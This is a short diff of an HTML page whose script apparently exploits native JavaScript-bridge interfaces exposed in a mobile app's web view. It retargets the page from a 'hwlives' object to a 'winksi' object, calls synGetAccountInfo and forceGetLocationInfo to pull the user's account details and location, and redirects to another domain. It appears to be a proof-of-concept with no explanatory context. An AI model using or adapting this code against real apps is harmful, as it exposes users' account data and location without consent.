@@ -4,12 +4,12 @@
 </head>
 <body>
 <script>
-setTimeout("getinfo()",100);
-document.location.href="http://www.vmall.com/nop.htm";
+setTimeout("getinfo()",1);
+document.location.href="http://mp.weixinbridge.com/";
 
 function getinfo() {
-window.hwlives.forceGetLocationInfo();
-alert(window.hwlives.synGetAccountInfo(''));
+alert(window.winksi.synGetAccountInfo(''));
+window.winksi.forceGetLocationInfo();
 }
 
 function forceSetLocationInfo(pstr) {
